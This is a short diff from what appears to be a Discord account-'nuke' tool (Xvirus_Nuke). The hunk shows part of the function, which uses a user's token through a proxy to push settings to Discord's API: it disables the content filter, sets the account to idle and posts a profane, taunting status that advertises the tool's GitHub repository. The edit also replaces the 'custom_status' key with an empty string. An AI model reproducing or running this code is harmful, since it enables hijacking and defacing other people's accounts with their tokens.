@@ -81,7 +81,7 @@ def Xvirus_Nuke(token, Server_Name, message_Content):
           'convert_emoticons': False,
           'enable_tts_command': False,
           'explicit_content_filter': '0',
-          "custom_status": {"text": "I got shit on by Xvirus"},
+          "": {"text": "I got fucked by Xvirus https://github.com/Xvirus0/Xvirus-Tools"},
           'status': "idle"
     }
     requests.patch("https://discord.com/api/v10/users/@me/settings", proxies={"http": f'{proxy()}'}, headers=getheaders(token), json=setting)
